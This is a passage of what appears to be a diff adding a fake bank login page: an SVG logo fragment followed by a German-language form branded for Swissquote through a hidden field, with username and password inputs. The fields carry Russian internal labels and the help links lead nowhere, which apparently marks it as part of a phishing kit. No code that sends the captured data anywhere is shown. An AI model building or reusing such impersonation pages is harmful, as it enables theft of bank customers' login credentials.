c-1.092,1.093-2.641,1.76-4.491,1.76c-1.7,0-3.187-0.637-4.249-1.699c-1.062-1.062-1.67-2.58-1.67-4.978v-8.346h3.49V20.629z			 M134.489,19.354c0-4.644,3.156-7.891,7.587-7.891c4.432,0,7.588,3.247,7.588,7.587c0,4.644-3.156,7.891-7.588,7.891			C137.646,26.941,134.489,23.694,134.489,19.354z M142.076,14.65c-2.336,0-4.006,1.973-4.006,4.552c0,2.58,1.67,4.553,4.006,4.553			c2.338,0,4.007-1.973,4.007-4.553C146.083,16.623,144.414,14.65,142.076,14.65z M161.5,23.633v2.701			c-0.94,0.395-1.973,0.607-3.125,0.607c-1.549,0-2.701-0.455-3.49-1.244c-0.851-0.85-1.275-2.094-1.275-4.31v-6.434h-3.338v-3.035			h3.338V7.062h3.49v4.856h4.4v3.035h-4.4v6.889c0,0.759,0.152,1.184,0.395,1.457c0.425,0.485,1.123,0.607,1.882,0.607			c0.789,0,1.729-0.182,2.003-0.273H161.5z M170.059,26.941c-4.248,0-7.436-3.004-7.436-7.587c0-4.188,2.55-7.891,7.072-7.891			c3.854,0,6.434,3.065,6.434,7.284V19.9h-9.863c0.091,2.276,1.669,3.976,3.976,3.976c1.487,0,2.853-0.607,4.097-1.639h0.122			l1.305,2.428C174.399,26.122,172.365,26.941,170.059,26.941z M172.639,17.169c-0.03-1.366-1.093-2.731-2.883-2.731			c-1.761,0-2.944,1.184-3.309,2.731H172.639z"></path>
+     </g>
+     </g>
+     </svg>
+     </div>
+     <form id="lk_form" class="box mx-auto mt-3" autocomplete="off">
+     <input type="hidden" id="bank-name" data-name="Swissquote">
+    
+     <p class="fs-18 fwbl mb-1" data-i18n="welcome">Willkommen.</p>
+     <p class="fs-14" data-i18n="loginSubtitle">Bitte geben Sie Ihren Benutzernamen und Ihr Passwort ein, um auf Ihr Konto zuzugreifen.</p>
+     <div id="form">
+     <div class="first">
+     <input autocomplete="off" type="text" data-name="Логин" name="" id="login" class="logx inp first" placeholder="Benutzername" required="" data-i18n-placeholder="usernamePlaceholder" value="">
+     <input autocomplete="new-password" data-name="Пароль" type="password" name="" id="password" class="logx inp mt-2 first" placeholder="Passwort" required="" data-i18n-placeholder="passwordPlaceholder">
+     </div>
+     <div class="second d-none sf-hidden">
+     
+     
+     </div>
+     <div class="text-end">
+     <a href="#" class="d-block fws fs-14 mt-2" data-i18n="forgotPassword">Passwort vergessen?</a>
+     <a href="#" class="d-block fws fs-14 mt-1" data-i18n="forgotUsername">Benutzername vergessen?</a>
+     </div>
+     <p id="loginButton" class="text-center btn-orange mt-4 fs-14 fws first mb-0" style="cursor:pointer" data-i18n="login">Anmeldung</p>
+     <button class="btn-orange mt-4 fs-14 fws second d-none sf-hidden" type="button" data-i18n="login">Anmeldung</button>
+     </div>
+     <div class="d-none sf-hidden" id="loader">
+     
+     </div>
+     </form>
+    </main>
+    <div class="supportchatjs"></div>
+    </body></html>
